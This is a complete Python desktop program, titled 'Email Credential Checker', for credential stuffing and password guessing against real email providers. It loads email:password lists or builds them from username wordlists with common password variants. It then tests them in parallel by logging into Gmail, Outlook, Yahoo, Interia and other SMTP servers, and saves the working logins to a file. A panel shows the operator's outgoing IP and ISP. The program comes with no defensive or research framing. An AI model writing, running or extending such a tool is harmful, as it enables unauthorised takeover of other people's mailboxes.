import sys
import os
import smtplib
import ssl
import time
import socket
import random
import threading
import queue
import requests  # Add this line
import imaplib
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from tkinter.font import Font
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class SMTPChecker:
    def __init__(self, callback=None, logger=None):
        self.callback = callback
        self.logger = logger
        self.is_running = False
        self.pause_event = threading.Event()
        self.pause_event.set()  # Not paused initially
        self.stop_event = threading.Event()
        self.queue = queue.Queue()
        self.threads = []
        self.results = {
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'total': 0
        }
        self.valid_credentials = []
        self.error_credentials = []
        
        try:
            import imaplib
            self.imaplib = imaplib
        except ImportError:
            self.log("Warning: imaplib module not available. IMAP support will be limited.")
            self.imaplib = None
    
    def start_checking(self, credentials, server, port, protocol="smtp", threads=5, delay=1, use_ssl=True, timeout=10):
        if self.is_running:
            return False
        
        self.stop_event.clear()
        self.pause_event.set()
        self.is_running = True
        self.results = {'valid': 0, 'invalid': 0, 'errors': 0, 'total': len(credentials)}
        self.valid_credentials = []
        self.error_credentials = []
        
        for email, password in credentials:
            self.queue.put((email, password))
        
        self.threads = []
        for _ in range(min(threads, len(credentials))):
            t = threading.Thread(
                target=self.worker,
                args=(server, port, protocol, use_ssl, timeout, delay)
            )
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        return True
    
    def worker(self, server, port, protocol, use_ssl, timeout, delay):
        while not self.stop_event.is_set():
            # Wait if paused
            self.pause_event.wait()
            
            try:
                # Get a credential from the queue with a timeout
                email, password = self.queue.get(timeout=1)
            except queue.Empty:
                break
                
            try:
                is_valid = False
                error = None
                
                if protocol == "smtp":
                    is_valid, error = self.check_smtp(email, password, server, port, use_ssl, timeout)
                else:
                    error = "Unsupported protocol"
                
                # Update results based on check outcome
                if is_valid:
                    self.valid_credentials.append(f"{email}:{password}")
                    self.results['valid'] += 1
                    self.log(f"Valid: {email}:{password}")
                else:
                    self.results['invalid'] += 1
                    if error:
                        self.error_credentials.append(f"{email}:{password} - {error}")
                        self.results['errors'] += 1
                        self.log(f"Error: {email}:{password} - {error}")
                    else:
                        self.log(f"Invalid: {email}:{password}")
                
                # Notify callback if available
                if self.callback:
                    self.callback(self.results)
                    
            except Exception as e:
                self.results['errors'] += 1
                self.error_credentials.append(f"{email}:{password} - {str(e)}")
                self.log(f"Exception: {email}:{password} - {str(e)}")
                if self.callback:
                    self.callback(self.results)
            
            finally:
                self.queue.task_done()
                
            # Apply delay between checks
            if delay > 0 and not self.stop_event.is_set():
                time.sleep(delay)

    def check_smtp(self, email, password, server, port, use_ssl, timeout):
        try:
            if use_ssl:
                context = ssl.create_default_context()
                server_obj = smtplib.SMTP_SSL(server, port, timeout=timeout, context=context)
            else:
                server_obj = smtplib.SMTP(server, port, timeout=timeout)
                server_obj.starttls()
                
            server_obj.login(email, password)
            server_obj.quit()
            return True, None
        except smtplib.SMTPAuthenticationError:
            return False, None
        except Exception as e:
            return False, str(e)
    
    def stop_checking(self):
        if not self.is_running:
            return
        
        self.stop_event.set()
        self.pause_event.set()
        
        for t in self.threads:
            if t.is_alive():
                t.join(1)
        
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except queue.Empty:
                break
        
        self.is_running = False
        self.log("Checking stopped")
    
    def pause_checking(self):
        if self.is_running and self.pause_event.is_set():
            self.pause_event.clear()
            self.log("Checking paused")
            return True
        return False
    
    def resume_checking(self):
        if self.is_running and not self.pause_event.is_set():
            self.pause_event.set()
            self.log("Checking resumed")
            return True
        return False
    
    def log(self, message):
        if self.logger:
            self.logger(message)
        else:
            print(message)
    
    def save_results(self, valid_file, error_file):
        try:
            with open(valid_file, 'w') as f:
                f.write('\n'.join(self.valid_credentials))
            
            with open(error_file, 'w') as f:
                f.write('\n'.join(self.error_credentials))
            
            return True
        except Exception as e:
            self.log(f"Error saving results: {str(e)}")
            return False
        
class EmailCheckerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Email Credential Checker")
        self.root.geometry("950x700")
        self.root.resizable(True, True)
        
        try:
            self.root.iconbitmap("smtp_icon.ico")
        except:
            pass
        
        self.style = ttk.Style()
        self.style.configure("TButton", padding=6, relief="flat")
        self.style.configure("TFrame", background="#f0f0f0")
        self.style.configure("TLabel", background="#f0f0f0")
        self.style.configure("Header.TLabel", font=("Helvetica", 12, "bold"))
        self.style.configure("Success.TLabel", foreground="green")
        self.style.configure("Error.TLabel", foreground="red")
        
        self.checker = SMTPChecker(callback=self.update_stats, logger=self.log_message)
        
        self.create_ui()
    
    def create_ui(self):
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.tab_control = ttk.Notebook(main_frame)
        
        self.main_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.main_tab, text="SMTP Checker")
        
        self.settings_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.settings_tab, text="Settings")
        
        self.tab_control.pack(fill=tk.BOTH, expand=True)
        
        self.setup_main_tab()
        self.setup_settings_tab()
        self.set_default_servers()
    
    def setup_main_tab(self):
        left_frame = ttk.Frame(self.main_tab, padding=5)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_frame = ttk.Frame(self.main_tab, padding=5)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        creds_frame = ttk.LabelFrame(left_frame, text="Credentials", padding=5)
        creds_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        cred_btn_frame = ttk.Frame(creds_frame)
        cred_btn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(cred_btn_frame, text="Import File", command=self.import_credentials_file).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Import Wordlist", command=self.import_wordlist).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Clear", command=lambda: self.credentials_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Copy", command=lambda: self.copy_to_clipboard(self.credentials_text.get(1.0, tk.END))).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Paste", command=lambda: self.paste_from_clipboard(self.credentials_text)).pack(side=tk.LEFT, padx=2)
        
        self.credentials_text = scrolledtext.ScrolledText(creds_frame, height=15)
        self.credentials_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        control_frame = ttk.LabelFrame(left_frame, text="Control", padding=5)
        control_frame.pack(fill=tk.X, pady=5)
        
        self.server_frame = ttk.Frame(control_frame)
        self.server_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(self.server_frame, text="Protocol:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.protocol_var = tk.StringVar(value="smtp")
        protocol_combo = ttk.Combobox(self.server_frame, textvariable=self.protocol_var, width=6, state="readonly")
        protocol_combo['values'] = ('smtp', 'imap')
        protocol_combo.grid(row=0, column=1, padx=5, sticky=tk.W)
        
        self.server_label = ttk.Label(self.server_frame, text="SMTP Server:")
        self.server_label.grid(row=1, column=0, padx=5, sticky=tk.W)
        
        self.server_var = tk.StringVar(value="poczta.interia.pl")
        ttk.Entry(self.server_frame, textvariable=self.server_var).grid(row=1, column=1, padx=5, sticky=tk.W+tk.E, columnspan=2)
        
        ttk.Label(self.server_frame, text="Port:").grid(row=1, column=3, padx=5, sticky=tk.W)
        self.port_var = tk.IntVar(value=465)
        ttk.Entry(self.server_frame, textvariable=self.port_var, width=6).grid(row=1, column=4, padx=5, sticky=tk.W)
        
        self.ssl_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(self.server_frame, text="Use SSL", variable=self.ssl_var).grid(row=1, column=5, padx=5, sticky=tk.W)
                # Add after control_frame.pack(fill=tk.X, pady=5)
        ip_frame = ttk.LabelFrame(control_frame, text="Connection Info", padding=5)
        ip_frame.pack(fill=tk.X, pady=5)

        # IP info variables
        self.ip_var = tk.StringVar(value="Not checked")
        self.country_var = tk.StringVar(value="Not checked")
        self.isp_var = tk.StringVar(value="Not checked")

        # IP info labels
        ttk.Label(ip_frame, text="IP Address:").grid(row=0, column=0, padx=5, sticky=tk.W)
        ttk.Label(ip_frame, textvariable=self.ip_var).grid(row=0, column=1, padx=5, sticky=tk.W)

        ttk.Label(ip_frame, text="Country:").grid(row=1, column=0, padx=5, sticky=tk.W)
        ttk.Label(ip_frame, textvariable=self.country_var).grid(row=1, column=1, padx=5, sticky=tk.W)

        ttk.Label(ip_frame, text="ISP:").grid(row=2, column=0, padx=5, sticky=tk.W)
        ttk.Label(ip_frame, textvariable=self.isp_var).grid(row=2, column=1, padx=5, sticky=tk.W)

        ttk.Button(ip_frame, text="Check IP", command=self.update_ip_info).grid(row=3, column=0, columnspan=2, pady=5)

        def update_protocol(*args):
            protocol = self.protocol_var.get()
            if protocol == "smtp":
                self.server_label.config(text="SMTP Server:")
                if self.port_var.get() == 143 or self.port_var.get() == 993:
                    self.port_var.set(465)
            else:
                self.server_label.config(text="IMAP Server:")
                if self.port_var.get() == 465 or self.port_var.get() == 587:
                    self.port_var.set(993)
        
        self.protocol_var.trace("w", update_protocol)
        
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="Start", command=self.start_checking)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.pause_btn = ttk.Button(btn_frame, text="Pause", command=self.pause_resume_checking, state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="Stop", command=self.stop_checking, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Save Results", command=self.save_results).pack(side=tk.LEFT, padx=5)
        
        progress_frame = ttk.LabelFrame(right_frame, text="Progress", padding=5)
        progress_frame.pack(fill=tk.X, pady=5)
        
        stats_frame = ttk.Frame(progress_frame)
        stats_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(stats_frame, text="Total:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.total_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.total_var).grid(row=0, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Valid:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.valid_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.valid_var, style="Success.TLabel").grid(row=1, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Invalid:").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.invalid_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.invalid_var, style="Error.TLabel").grid(row=2, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Errors:").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.errors_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.errors_var).grid(row=3, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Status:").grid(row=4, column=0, padx=5, sticky=tk.W)
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(stats_frame, textvariable=self.status_var).grid(row=4, column=1, padx=5, sticky=tk.W)
        
        self.progress_var = tk.DoubleVar(value=0.0)
        self.progress_bar = ttk.Progressbar(progress_frame, orient=tk.HORIZONTAL, length=200, mode='determinate', variable=self.progress_var)
        self.progress_bar.pack(fill=tk.X, pady=5)
        
        log_frame = ttk.LabelFrame(right_frame, text="Log", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=20)
        self.log_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        results_frame = ttk.LabelFrame(right_frame, text="Valid Credentials", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.results_text = scrolledtext.ScrolledText(results_frame, height=10)
        self.results_text.pack(fill=tk.BOTH, expand=True, pady=5)
    
    def setup_settings_tab(self):
        settings_frame = ttk.Frame(self.settings_tab, padding=10)
        settings_frame.pack(fill=tk.BOTH, expand=True)
        
        thread_frame = ttk.LabelFrame(settings_frame, text="Threading", padding=5)
        thread_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(thread_frame, text="Threads:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.threads_var = tk.IntVar(value=5)
        ttk.Spinbox(thread_frame, from_=1, to=50, textvariable=self.threads_var, width=5).grid(row=0, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(thread_frame, text="Delay (seconds):").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.delay_var = tk.DoubleVar(value=1.0)
        ttk.Spinbox(thread_frame, from_=0.0, to=10.0, increment=0.1, textvariable=self.delay_var, width=5).grid(row=1, column=1, padx=5, sticky=tk.W)
        
        conn_frame = ttk.LabelFrame(settings_frame, text="Connection", padding=5)
        conn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_frame, text="Timeout (seconds):").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.timeout_var = tk.IntVar(value=10)
        ttk.Spinbox(conn_frame, from_=1, to=60, textvariable=self.timeout_var, width=5).grid(row=0, column=1, padx=5, sticky=tk.W)
        
        ttk.Button(settings_frame, text="Save Settings", command=self.save_settings).pack(pady=10)
    
    def set_default_servers(self):
        self.server_defaults = {
            "smtp": {
                "interia.pl": {"server": "poczta.interia.pl", "port": 465, "ssl": True},
                "interia.eu": {"server": "poczta.interia.pl", "port": 465, "ssl": True},
                "interia.com": {"server": "poczta.interia.pl", "port": 465, "ssl": True},
                "gmail.com": {"server": "smtp.gmail.com", "port": 465, "ssl": True},
                "outlook.com": {"server": "smtp-mail.outlook.com", "port": 587, "ssl": True},
                "hotmail.com": {"server": "smtp-mail.outlook.com", "port": 587, "ssl": True},
                "yahoo.com": {"server": "smtp.mail.yahoo.com", "port": 465, "ssl": True},
                "aol.com": {"server": "smtp.aol.com", "port": 465, "ssl": True},
                "wp.pl": {"server": "smtp.wp.pl", "port": 465, "ssl": True},
                "o2.pl": {"server": "smtp.o2.pl", "port": 465, "ssl": True},
                "onet.pl": {"server": "smtp.poczta.onet.pl", "port": 465, "ssl": True},
            },
            "imap": {
                "interia.pl": {"server": "poczta.interia.pl", "port": 993, "ssl": True},
                "interia.eu": {"server": "poczta.interia.pl", "port": 993, "ssl": True},
                "interia.com": {"server": "poczta.interia.pl", "port": 993, "ssl": True},
                "gmail.com": {"server": "imap.gmail.com", "port": 993, "ssl": True},
                "outlook.com": {"server": "outlook.office365.com", "port": 993, "ssl": True},
                "hotmail.com": {"server": "outlook.office365.com", "port": 993, "ssl": True},
                "yahoo.com": {"server": "imap.mail.yahoo.com", "port": 993, "ssl": True},
                "aol.com": {"server": "imap.aol.com", "port": 993, "ssl": True},
                "wp.pl": {"server": "imap.wp.pl", "port": 993, "ssl": True},
                "o2.pl": {"server": "imap.o2.pl", "port": 993, "ssl": True},
                "onet.pl": {"server": "imap.poczta.onet.pl", "port": 993, "ssl": True},
            }
        }
        
        ttk.Button(self.server_frame, text="Auto-Detect", command=self.auto_detect_server).grid(row=1, column=6, padx=5, sticky=tk.W)
    
    def auto_detect_server(self):
        cred_text = self.credentials_text.get(1.0, tk.END).strip()
        if not cred_text:
            messagebox.showwarning("Warning", "No credentials to detect from")
            return
        
        for line in cred_text.split('\n'):
            line = line.strip()
            if ':' in line:
                email, _ = line.split(':', 1)
                if '@' in email:
                    domain = email.split('@')[-1].lower()
                    protocol = self.protocol_var.get()
                    
                    if domain in self.server_defaults[protocol]:
                        settings = self.server_defaults[protocol][domain]
                        self.server_var.set(settings["server"])
                        self.port_var.set(settings["port"])
                        self.ssl_var.set(settings["ssl"])
                        messagebox.showinfo("Auto-Detect", f"Set server settings for {domain}")
                        return
        
        messagebox.showinfo("Auto-Detect", "Could not detect server settings from email domain")
    
    def import_wordlist(self):
        file_path = filedialog.askopenfilename(
            title="Select Wordlist File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        
        if file_path:
            try:
                domain = simpledialog.askstring(
                    "Email Domain", 
                    "Enter email domain (e.g., interia.pl):",
                    initialvalue="interia.pl"
                )
                
                if not domain:
                    return
                
                create_variations = messagebox.askyesno(
                    "Create Variations",
                    "Create variations? (e.g., username, username123, etc.)"
                )
                
                with open(file_path, 'r') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                
                credentials = []
                for word in wordlist:
                    email = f"{word}@{domain}"
                    credentials.append(f"{email}:{word}")
                    
                    if create_variations:
                        variations = [
                            f"{email}:{word}123",
                            f"{email}:{word}1234",
                            f"{email}:{word}12345",
                            f"{email}:{word}!",
                            f"{email}:{word}@",
                            f"{email}:{word}#",
                            f"{email}:{word}$",
                            f"{email}:{word.capitalize()}",
                            f"{email}:{word.upper()}",
                        ]
                        credentials.extend(variations)
                
                self.credentials_text.delete(1.0, tk.END)
                self.credentials_text.insert(tk.END, "\n".join(credentials))
                self.log_message(f"Generated {len(credentials)} credentials from wordlist")
                
                self.auto_detect_server()
                
            except Exception as e:
                messagebox.showerror("Wordlist Error", f"Error processing wordlist: {str(e)}")
    
    def import_credentials_file(self):
        file_path = filedialog.askopenfilename(
            title="Select Credentials File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                
                self.credentials_text.delete(1.0, tk.END)
                self.credentials_text.insert(tk.END, content)
                self.log_message(f"Imported credentials from {file_path}")
                
                self.auto_detect_server()
                
            except Exception as e:
                messagebox.showerror("Import Error", f"Error importing file: {str(e)}")
    
    def copy_to_clipboard(self, text):
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.log_message("Copied to clipboard")
    
    def paste_from_clipboard(self, text_widget):
        try:
            text = self.root.clipboard_get()
            text_widget.insert(tk.END, text)
            self.log_message("Pasted from clipboard")
        except Exception as e:
            self.log_message(f"Error pasting from clipboard: {str(e)}")
    


    def save_settings(self):
        self.log_message("Settings saved")
    
    def start_checking(self):
        # Update IP info before starting
        self.update_ip_info()
        
        cred_text = self.credentials_text.get(1.0, tk.END).strip()
        if not cred_text:
            messagebox.showwarning("Warning", "No credentials to check")
            return
        
        credentials = []
        for line in cred_text.split('\n'):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                credentials.append((email, password))
        
        if not credentials:
            messagebox.showwarning("Warning", "No valid credentials found")
            return
        
        server = self.server_var.get()
        port = self.port_var.get()
        protocol = self.protocol_var.get()
        threads = self.threads_var.get()
        delay = self.delay_var.get()
        use_ssl = self.ssl_var.get()
        timeout = self.timeout_var.get()
        
        if self.checker.start_checking(
            credentials, 
            server, 
            port,
            protocol=protocol,
            threads=threads, 
            delay=delay, 
            use_ssl=use_ssl, 
            timeout=timeout
        ):
            self.status_var.set("Running")
            self.start_btn.config(state=tk.DISABLED)
            self.pause_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.NORMAL)
            
            self.results_text.delete(1.0, tk.END)
            
            self.total_var.set(str(len(credentials)))
            self.valid_var.set("0")
            self.invalid_var.set("0")
            self.errors_var.set("0")
            
            self.log_message(f"Started checking {len(credentials)} credentials")
        else:
            self.log_message("Failed to start checking")
    
    def pause_resume_checking(self):
        if self.checker.is_running:
            if self.pause_btn["text"] == "Pause":
                if self.checker.pause_checking():
                    self.pause_btn["text"] = "Resume"
                    self.status_var.set("Paused")
            else:
                if self.checker.resume_checking():
                    self.pause_btn["text"] = "Pause"
                    self.status_var.set("Running")
    
    def stop_checking(self):
        if self.checker.is_running:
            self.checker.stop_checking()
            
            self.status_var.set("Stopped")
            self.start_btn.config(state=tk.NORMAL)
            self.pause_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.DISABLED)
            self.pause_btn["text"] = "Pause"
            
            self.log_message("Checking stopped")
    
    def save_results(self):
        if not self.checker.valid_credentials and not self.checker.error_credentials:
            messagebox.showwarning("Warning", "No results to save")
            return
        
        directory = filedialog.askdirectory(title="Select Directory to Save Results")
        if not directory:
            return
        
        valid_file = os.path.join(directory, "valid_smtp.txt")
        error_file = os.path.join(directory, "errors.txt")
        
        if self.checker.save_results(valid_file, error_file):
            self.log_message(f"Results saved to {directory}")
            messagebox.showinfo("Success", f"Results saved to {directory}")
        else:
            messagebox.showerror("Error", "Failed to save results")
    
    def update_stats(self, results):
        self.valid_var.set(str(results['valid']))
        self.invalid_var.set(str(results['invalid']))
        self.errors_var.set(str(results['errors']))
        
        total = results['total']
        if total > 0:
            completed = results['valid'] + results['invalid'] + results['errors']
            progress = (completed / total) * 100
            self.progress_var.set(progress)
        
        if results['valid'] > 0 and self.checker.valid_credentials:
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, "\n".join(self.checker.valid_credentials))
    
    def log_message(self, message):
        current_time = time.strftime("%H:%M:%S")
        
        self.log_text.insert(tk.END, f"[{current_time}] {message}\n")
        self.log_text.see(tk.END)

    def update_ip_info(self):
        """Update the IP information display."""
        try:
            response = requests.get('http://ip-api.com/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                self.ip_var.set(data.get('query', 'Unknown'))
                self.country_var.set(data.get('country', 'Unknown'))
                self.isp_var.set(data.get('isp', 'Unknown'))
                self.log_message(f"IP: {data.get('query')} ({data.get('country')}) - {data.get('isp')}")
            else:
                self.log_message("Failed to fetch IP info")
        except Exception as e:
            self.log_message(f"Error getting IP info: {str(e)}")
            self.ip_var.set("Error")
            self.country_var.set("Error")
            self.isp_var.set("Error")

def main():
    missing_libs = []
    
    try:
        import imaplib
    except ImportError:
        missing_libs.append("imaplib")
        print("imaplib not found. IMAP support might be limited.")
    
    root = tk.Tk()
    app = EmailCheckerGUI(root)
    
    if missing_libs:
        message = "The following libraries are missing and some features may be limited:\n"
        message += ", ".join(missing_libs)
        message += "\n\nRecommended: Install them using pip."
        messagebox.showwarning("Missing Libraries", message)
    
    root.mainloop()

if __name__ == "__main__":
    main()